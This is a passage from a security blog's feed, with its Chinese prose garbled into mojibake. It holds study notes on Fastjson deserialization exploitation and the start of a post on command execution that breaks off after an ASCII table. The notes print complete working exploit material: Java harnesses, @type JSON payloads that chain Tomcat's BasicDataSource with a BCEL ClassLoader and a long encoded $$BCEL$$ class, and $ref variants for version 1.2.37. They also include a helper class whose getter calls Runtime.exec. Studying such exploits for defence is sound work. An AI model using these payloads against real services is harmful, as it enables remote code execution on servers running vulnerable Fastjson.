src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321140349525.png" alt="image-20240321140349525"></p><p>ç»“åˆpayloadå¯å¾—åœ¨è¿™é‡Œç”±äºkeyä¸ä¸ºnullï¼Œæ‰€ä»¥è°ƒç”¨äº†toStringæ–¹æ³•ï¼Œkeyä¸º<code>JSONObject</code>å¯¹è±¡ï¼Œä¼šè°ƒç”¨è¯¥å¯¹è±¡çš„toStringæ–¹æ³•ã€‚è€Œä¸”JSONObjectæ˜¯Mapçš„å­ç±»ï¼Œå½“è°ƒç”¨<code>toString</code>çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨è¯¥ç±»çš„getteræ–¹æ³•è·å–å€¼ï¼ˆå¯¹äºgetConnectionçš„è§¦å‘è¿˜æœ‰ä¸€ç§è§£é‡Š<strong><a href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1904">https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1904</a></strong>ï¼‰ï¼Œè¿›è€Œè§¦å‘geté“¾ï¼Œä¸Šé¢å·²ç»ç»™å‡ºäº†JSON.parseçš„æµ‹è¯•ä»£ç ï¼Œä¸‹é¢æ˜¯JSON.parseObjectçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="comment">//import org.apache.tomcat.dbcp.dbcp.BasicDataSource;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, SQLException &#123;</span><br><span class="line">        <span class="comment">//fj1.2.24</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                &#125;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;&quot;</span>+str+<span class="string">&quot;\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;        &#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line"><span class="comment">//        BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassName(str);</span></span><br><span class="line"><span class="comment">//        basicDataSource.getConnection();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®åŒ…ç‰ˆæœ¬çš„ä¸åŒpayloadä¼šç•¥æœ‰å·®å¼‚ï¼Œæœ‰äº›åŒ…è°ƒç”¨çš„å¯èƒ½å°±æ˜¯org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>ç±»è·¯å¾„éœ€è¦æ ¹æ®å®é™…æƒ…å†µè€Œå®šï¼Œè¿è¡Œç»“æœ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321175438078.png" alt="image-20240321175438078"></p><p>ä»¥ä¸Šæ–¹æ³•åªé’ˆå¯¹äºfj&lt;=1.2.36ç‰ˆæœ¬çš„æƒ…å†µï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>ä¸‹å›¾ä¸ºfj1.2.37ä¸­çš„keyéƒ¨åˆ†ï¼Œå‘ç°å·²ç»æ²¡æœ‰äº†toStringæ–¹æ³•ï¼Œä¹‹å‰å¯¹äºJSON.parseå’ŒJSON.parseObjectçš„payloadéƒ½æ˜¯é€šè¿‡å°†keyè®¾ç½®ä¸ºJSONObjectå¯¹è±¡æ¥è§¦å‘toStringï¼Œè¿›è€Œä¾æ¬¡è°ƒç”¨è¯¥ç±»çš„getteråŠ è½½æ¶æ„ä»£ç ï¼Œå¦‚æœæ²¡æœ‰äº†toStringï¼Œé‚£ä¹ˆpayloadä¹Ÿå°±å¤±å»äº†ä½œç”¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240322005147162.png" alt="image-20240322005147162"></p><h2 id="é€šè¿‡-refè¿›è¡Œè°ƒç”¨">é€šè¿‡$refè¿›è¡Œè°ƒç”¨</h2><p>æ¥ä¸‹æ¥çš„æµ‹è¯•æˆ‘çš„fjæ¢æˆäº†1.2.37</p><p><strong>ä»€ä¹ˆæ˜¯ref</strong></p><p>refæ˜¯fastjsonç‰¹æœ‰çš„JSONPathè¯­æ³•ï¼Œç”¨æ¥å¼•ç”¨ä¹‹å‰å‡ºç°çš„å¯¹è±¡</p><p><strong>ä»€ä¹ˆæ˜¯JSONPath</strong></p><p><a href="https://blog.csdn.net/itguangit/article/details/78764212">https://blog.csdn.net/itguangit/article/details/78764212</a></p><p>æµ‹è¯•ä»£ç </p><p>RefTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">private</span> String test;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTest</span><span class="params">(String test)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.test=test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">setTest</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BCEL_refTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL_refTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;classloader.RefTest\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;classloader.RefTest\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;,\&quot;test\&quot;:\&quot;test\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[1].cmd\&quot;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;classloader.RefTest&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;calc&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$[1].cmd&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹jsonpathåœ¨è¯¥payloadé‡Œçš„ä½œç”¨ï¼Œ$[1]ä»£è¡¨å¼•ç”¨äº†å½“å‰æ•°ç»„çš„ç¬¬äºŒä¸ªå˜é‡ï¼Œä¹Ÿå°±æ˜¯</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;classloader.RefTest&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;calc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>.cmdä»£è¡¨è·å–è¯¥å¯¹è±¡ä¸­cmdçš„å€¼ï¼Œç›¸æ¯”äºä¹‹å‰çš„payloadï¼Œ$refä¸»è¦æ˜¯é€šè¿‡JSONPathçš„å½¢å¼è¿›è¡Œäº†å¯¹è±¡å’Œå±æ€§çš„è°ƒç”¨ï¼Œåˆ©ç”¨åå°„è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿›è€Œæ‰§è¡Œæ¶æ„æ–¹æ³•ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡$refè°ƒç”¨ä¸Šé¢è¯´åˆ°çš„connectionï¼Œè¿›è€Œè§¦å‘ä»–çš„getæ–¹æ³•</p><p>æµ‹è¯•ä»£ç ï¼š</p><p><strong>BCEL_refTest.java</strong></p><p>è¿è¡Œçš„æ—¶å€™æŠ¥äº†ä¸¤æ¬¡é”™ï¼Œåº”è¯¥æ˜¯tomcatç‰ˆæœ¬çš„é—®é¢˜ï¼Œé«˜ç‰ˆæœ¬åŠ äº†waf</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL_refTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\&quot;driverClassName\&quot;:\&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A\&quot;&#125;,&#123;\&quot;$ref\&quot;: \&quot;$[0].Connection\&quot;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span><span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span><span class="string">&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$[0].Connection&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œç»“æœ</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240322132610173.png" alt="image-20240322132610173"></p><p><strong>è¿‡ç¨‹åˆ†æ</strong></p><p><a href="https://blog.csdn.net/solitudi/article/details/120275526">https://blog.csdn.net/solitudi/article/details/120275526</a></p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œæ€»ç»“</title>
    <link href="https://bowuchuling.github.io/posts/1837iuw8.html"/>
    <id>https://bowuchuling.github.io/posts/1837iuw8.html</id>
    <published>2024-03-26T09:40:43.697Z</published>
    <updated>2024-03-26T09:58:55.737Z</updated>
    
    <content type="html"><![CDATA[<h1>å‘½ä»¤æ‰§è¡Œ</h1><h2 id="ASCIIç è¡¨å®Œæ•´ç‰ˆ">ASCIIç è¡¨å®Œæ•´ç‰ˆ</h2><table><thead><tr><th>ASCIIå€¼</th><th>æ§åˆ¶å­—ç¬¦</th><th>ASCIIå€¼</th><th>æ§åˆ¶å­—ç¬¦</th><th>ASCIIå€¼</th><th>æ§åˆ¶å­—ç¬¦</th><th>ASCIIå€¼</th><th>æ§åˆ¶å­—ç¬¦</th></tr></thead><tbody><tr><td>0</td><td>NUT</td><td>32</td><td>(space)</td><td>64</td><td>@</td><td>96</td><td>ã€</td></tr><tr><td>1</td><td>SOH</td><td>33</td><td>!</td><td>65</td><td>A</td><td>97</td><td>a</td></tr><tr><td>2</td><td>STX</td><td>34</td><td>â€</td><td>66</td><td>B</td><td>98</td><td>b</td></tr><tr><td>3</td><td>ETX</td><td>35</td><td>#</td><td>67</td><td>C</td><td>99</td><td>c</td></tr><tr><td>4</td><td>EOT</td><td>36</td><td>$</td><td>68</td><td>D</td><td>100</td><td>d</td></tr><tr><td>5</td><td>ENQ</td><td>37</td><td>%</td><td>69</td><td>E</td><td>101</td><td>e</td></tr><tr><td>6</td><td>ACK</td><td>38</td><td>&amp;</td><td>70</td><td>F</td><td>102</td><td>f</td></tr><tr><td>7</td><td>BEL</td><td>39</td><td>,</td><td>71</td><td>G</td><td>103</td><td>g</td></tr><tr><td>8</td><td>BS</td><td>40</td><td>(</td><td>72</td><td>H</td><td>104</td><td>h</td></tr><tr><td>9</td><td>HT</td><td>41</td><td>)</td><td>73</td><td>I</td><td>105</td><td>i</td></tr><tr><td>10</td><td>LF</td><td>42</td><td>*</td><td>74</td><td>J</td><td>106</td><td>j</td></tr><tr><td>11</td><td>VT</td><td>43</td><td>+</td><td>75</td><td>K</td><td>107</td><td>k</td></tr><tr><td>12</td><td>FF</td><td>44</td><td>,</td><td>76</td><td>L</td><td>108</td><td>l</td></tr><tr><td>13</td><td>CR</td><td>45</td><td>-</td><td>77</td><td>M</td><td>109</td><td>m</td></tr><tr><td>14</td><td>SO</td><td>46</td><td>.</td><td>78</td><td>N</td><td>110</td><td>n</td></tr><tr><td>15</td><td>SI</td><td>47</td><td>/</td><td>79</td><td>O</td><td>111</td><td>o</td></tr><tr><td>16</td><td>DLE</td><td>48</td><td>0</td><td>80</td><td>P</td><td>112</td><td>p</td></tr><tr><td>17</td><td>DCI</td><td>49</td><td>1</td><td>81</td><td>Q</td><td>113</td><td>q</td></tr><tr><td>18</td><td>DC2</td><td>50</td><td>2</td><td>82</td><td>R</td><td>114</td><td>r</td></tr><tr><td>19</td><td>DC3</td><td>51</td><td>3</td><td>83</td><td>X</td><td>115</td><td>s</td></tr><tr><td>20</td><td>DC4</td><td>52</td><td>4</td><td>84</td><td>T</td><td>116</td><td>t</td></tr><tr><td>21</td><td>NAK</td><td>53</td><td>5</td><td>85</td><td>U</td><td>117</td><td>u</td></tr><tr><td>22</td><td>SYN</td><td>54</td><td>6</td><td>86</td><td>V</td><td>118</td><td>v</td></tr><tr><td>23</td><td>TB</td><td>55</td><td>7</td><td>87</td><td>W</td><td>119</td><td>w</td></tr><tr><td>24</td><td>CAN</td><td>56</td><td>8</td><td>88</td><td>X</td><td>120</td><td>x</td></tr><tr><td>25</td><td>EM</td><td>57</td><td>9</td><td>89</td><td>Y</td><td>121</td><td>y</td></tr><tr><td>26</td><td>SUB</td><td>58</td><td>:</td><td>90</td><td>Z</td><td>122</td><td>z</td></tr><tr><td>27</td><td>ESC</td><td>59</td><td>;</td><td>91</td><td>[</td><td>123</td><td>{</td></tr><tr><td>28</td><td>FS</td><td>60</td><td>&lt;</td><td>92</td><td>/</td><td>124</td><td>|</td></tr><tr><td>29</td><td>GS</td><td>61</td><td>=</td><td>93</td><td>]</td><td>125</td><td>}</td></tr><tr><td>30</td><td>RS</td><td>62</td><td>&gt;</td><td>94</td><td>^</td><td>126</td><td>~</td></tr><tr><td>31</td><td>US</td><td>63</td><td>?</td><td>95</td><td>â€”</td><td>127</td><td>DEL</td></tr></tbody></table><h2 